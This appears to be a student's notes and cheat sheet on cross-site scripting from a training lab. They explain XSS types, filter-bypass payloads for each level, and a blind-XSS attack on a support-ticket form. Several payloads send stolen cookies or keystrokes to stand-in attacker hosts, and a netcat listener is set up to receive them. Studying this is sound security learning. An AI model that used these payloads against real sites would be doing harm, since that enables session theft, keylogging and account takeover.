# INTRODUCTION TO CROSS SIDE SCRIPTING 

## INTRODUCTION

- XSS Stands for `cross-site scripting`

- It is  an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

## XSS PAYLOAD

- PAYLOADS are nothing but Javascript code, which is executed in the target's computer.
- In the payload we have 2 parts :
    - INTENTION --> What do u expect the payload to do .
    - MODIFICATION --> there are website, having different security and filters, so even for payload with same intention we might need code with modifications based on the website .


- EXAMPLE OF XSS INTENTIONS:
    
    1. PROOF OF CONCEPT
        - This is harmless, because its used to check if a website has a `XSS` Vulnerability or no.
        - Done via TEXT
        - payload : `<script>alert('yes');</script> `

    2. SESSION STEALIING

        - So when a user logs into a website his creds will be saved in his browser in the form of cookies
        - So here we intend to steal the user cookies from his browser and use it to log in as the `user`.
        - While sending, we encode the cookie using base64 so it does not append to url and fail
        - payload:`<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
            - fetch -> gives the cookie to attacker's endpoint ie `steal`
            - `btoa` -> for encoding 
            - `document.cookie`-> contains users session token
            - But, we cannot steal a cookie having `httponly` security using XSS.

    3. KEY LOGGER

    - This is used to capture the keys typed by the user on the website
    - payload: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
    
    4. BUSINESS LOGIC

    - Here , as we know in websites we have forgot pass.
    - So attacker uses,` user.changeEmail()` js and then sets the `send reset link` to attackers email address
    - Hence changes the password

    - payload: `<script>user.changeEmail('attacker@hacker.thm');</script>`


## REFLECTED XSS

- So here , the websites show the error, same as in the quety parameter wihtout input validation .

- EX: http://bank.com?error="wrongpass", website will displya `wrongpass`
- Now, what we can notice is the website is printing the same as written in the query param and so the attacker inject a `JS` code into it and send the URL to the target and when the user click the link, he sees the same , original page of bank.com, but behiind the scenes, we will see that JS is being executed

- Also, reflected XSS is just one time executing of the payload, meaning, the payload are not executed for anyone opening the browser, but only for those to whom the malicious link was shared !

- This is not same as phishing, because in phising we use fake website where as here , we use origiinal website


- How to test for Reflected XSS:

    - You'll need to test every possible point of entry; these include:
    - Parameters in the URL Query String
    - URL File Path
    - Sometimes HTTP Headers (although unlikely exploitable in practice)

- Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload

- - Reflected XSS     
    - Who injects the malicious code into the page?
        -	Server	Browser JavaScript
    
    - Does the server see the payload?	
        - Yes
    
    - Does the server see the payload?	
        - Yes

    - Does the page reload?	
        - yes

    - Where does the bug exist?	
        - backend code
    
    



## STORED XSS

- So here, the payload is affected by anyone who opens the website, becaause the payload used my attacker is stored in the database and shown to every user visiting the website.
- This is commn, in places such as comment section and places where user input can be seen by all.
- Because, the concept of comment section are like, it takes user data and stores in database and shows to whomever entering the website
- So hacker stores the payload as comment and the database doesnt filter it and stores it thinking it is a comment and when anyone visits, it is executed


## DOM - XSS

- DOM -> DOCUMENT OBJECT MODEL
- DOM is nothing but it is a structure of HTML and XML .
- DOM - XSS, is type of XSS where we inject the code into the URL
- So the JS on browser interact with attackers code and then executes the payload.
- Here, the payload does not go to the server , but directlt JS on browser initeract with our Code



- DOM-Based XSS
    - Who injects the malicious code into the page?
        - Browser JavaScript
    
    - Does the server see the payload?	
        - usually no

    - Does the server see the payload?	
        - Usually No

    - Does the page reload?	Yes	Often No
        - Usually no

    - Where does the bug exist?	
        - frontend code

- DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. 

- You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.

## BLIND XSS

- In blind XSS, this is same as stored XSS, but here the payload is not visible to the attacker.
- Here, we run the payload in the ticker form/support and when the curtomer support open it, the payload gets executed in their side and then we get their cookies and other access and information

- A popular tool for Blind XSS attacks is [https://github.com/mandatoryprogrammer/xsshunter-express].

- Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.


## PERFECTIONG YOUR PAYLOAD

- The payload is the JavaScript code we want to execute either on another user's browser or as a proof of concept to demonstrate a vulnerability in a website.

- How your JavaScript payload gets reflected in a target website's code will determine the payload you need to use

##

1. LEVEL 1

- Here, we have a input box
- I right click and went to inspect.
- I wrote name in the input box and it showed Hello `NAME` in the browser.
- In the developer option , i saw  Hello NAME being reflected.
- Now i change the input to `<script>alert('THM');<script>`
- The browser refkected THM and in the Developer tool it showed `hello <script>alert('THM');<script> `

\
2. LEVEL 2

- Now in level 2, when i wrote the name it got reflected in the Browser.
- So then , i went to DT(developer tools) and then i saw that name was like this : `hello <input value="name">`
- Now we cannot run the scripts inside attributes
- So i closed it using the following: `"><script>alert('THM');</script>`

- This payload, closes the input field and then executed the script

\
3. LEVEL 3

- Here instead of `<input value="name">`, we had `<textarea> name </textarea>`
- So here i closed the textarea first and then executed the payload as follows:
    - `</textarea><script>alert('THM');</script>`

\
4. LEVEL 4

- IN the level 4, the name inputted was reflected in the JS code itself , so had to escape the JS code before executinig out js payload
-   \<script>

        document.getElementsByClassName('name')[0].innerHTML='adam';
    
    \</script>

- See the name is being inputted in js code.
- so used the following payload to escape this thing: 
    - `';alert('THM');//`
    - first i escape the js code and then `//`is used to comment any other code thereafter
    - We did not write `<script>`as u can see the script already exist in js code

\
5. LEVEL 5

- In the level 5, we can see that `<script>` was beiing filtered after hello, so not executing
- so used the following : `<sscriptcript>alert('THM');</sscriptcript>`

\
6. LEVEL 6   

- What was the problem?
- Your input was placed inside an <img> tag, like this:
- `<img src="USER_INPUT">`

- You tried:
`"><script>alert('THM')</script>`

- It didn’t work

- Why didn’t it work? Because the website filters out < and >.

- So your payload became:
`"scriptalert('THM')/script`

- You cannot create new tags
- You cannot escape the <img> tag

- Key idea to bypass the filter
    - Even if you can’t create new tags, you can:
        - Add JavaScript to an existing tag using event attributes
            - `<img>` supports events like:
                - onload
                - onerror

- These attributes execute JavaScript automatically.

- Why onload works ? onload runs when the image finishes loading.

- Example:
`<img src="cat.jpg" onload="alert('THM')">`

- No `<script> `tag needed 

- The working payload
    - You inject:
        - `/images/cat.jpg" onload="alert('THM')`

- Which becomes:
`<img src="/images/cat.jpg" onload="alert('THM')">`


- You stayed inside the <img> tag
- You didn’t need < or >
- JavaScript executes via onload

- Why the alert appears? -> Image loads --> onload triggers --> JavaScript runs

- Alert pops up
    - XSS confirmed


## PRACTICAL

- This was last lab where i did the blind XSS
- So here `<textarea>` tag was so we removed it using `</textarea>`
- As we know blind XSS does not reflect anything on browser, so in order to capture the admin/support teams cookies i had to first start a session using netcat as follows:
    - `nc -nlvp 8001`
        - `nc` = netcat
        - `-n` = To avoid the resolution of hostnames via DNS
        - `l` = use netcat in listen mode ( silent capturing)
        - `-v` = verbose , to see if any errors occur
        - `-p` = port number

    - so using netcat we will capture the sessiion key if the support team opens the ticket of ours

- So i create a ticker ( because in DT of tickert description , we had found XSS) using the payload :
    - `<script>fetch('http://Attacker_url:port_nc?cookie=' + btoa(document.cookie));</script>`

- And then when i press submit, nothing happens
- Yeah, when any member of support team click the ticker with my payload, his session key will be captured !


#
# CHEAT SHEET 

## 1. TYPES 
## Type --> Source --> Visibility --> Server sees it?

- Reflected --> URL Parameter --> Instant (to the victim) --> Yes
- Stored --> Database (Comments) --> Persistent (to everyone) --> Yes
- DOM-Based --> Client-side JS --> Instant (to the victim) --> No
- Blind --> Support Tickets/Logs --> Delayed (to Attacker) --> Yes



## 2. PAYLOADS

- PoC (Proof of Concept): `<script>alert('XSS')</script>`

- Cookie Stealing: `<script>fetch('http://hacker.com/log?c=' + btoa(document.cookie))</script>`

- Keylogging:` <script>document.onkeypress = (e) => { fetch('http://hacker.com/log?k=' + btoa(e.key)) }</script>`



## 3. LEVELS

1. Level 2: Attribute Escape

- Target Code: `<input value="USER_INPUT">`
- The Hack:` "><script>alert('THM')</script>`
- `">` closes the value attribute

- Result:` <input value=""><script>alert('THM')</script>"> `(Injection successful)

\
2. Level 4: JavaScript Breakout

- Target Code: `document.getElementById('name').innerHTML='USER_INPUT';`(JS code)

- The Hack:` ';alert('THM');//` --> `';` this will stop executing the js code and execute alert .`//` comment anything after alert.

\
3. Level 5: Recursive Filtering

- The Trick: The server runs a function to delete `<script>`. By nesting it, the deletion itself creates the payload:

- Input: `<sscriptcript>`

- Server removes "script" (middle): `<s>` + cript = `<script>`

\
4. Level 6: Event Handlers (No Brackets)

- Target Code: `<img src="USER_INPUT">`

- The Hack: `cat.jpg" onload="alert('THM')`

- Mechanism: You don't need `<script>` tags if you use attributes like onload, onerror, onmouseover, or onclick.

## BLIND XSS

1. The Setup (Listener)

- Before submitting the payload, you must set up a receiver to catch the "stolen" data.
- Bash
    - `nc -nlvp 8001`
    - `nc`: Netcat (The networking "Swiss Army Knife").
    - `n`: Numeric only (No DNS lookup).
    - `l`: Listen mode.
    - `v`: Verbose (Show connection details).
    - `p`: Port number (Must match your payload).

2. The Payload (The Trap)

- Identified that the ticket description field was inside a `<textarea>`. The payload must break out and exfiltrate the cookie.

- Payload:` </textarea><script>fetch('http://ATTACKER_IP:8001?cookie=' + btoa(document.cookie));</script>`
    - `</textarea>`: Closes the existing tag to allow script execution.
    - `fetch()`: Sends a silent HTTP request to your IP.
    - `document.cookie`: Grabs the victim's session token.
    - `btoa()`: Encodes the cookie in Base64 to prevent special characters from breaking the URL request.

3. The Attack Flow

- Injection: Submit the payload via the support ticket form.

- Waiting: On your end, nothing happens initially (it is "Blind").

- Execution: When a Support Member opens your ticket in their dashboard, their browser executes the script.

- Capture: Your Netcat listener catches the GET request containing the Admin's session cookie.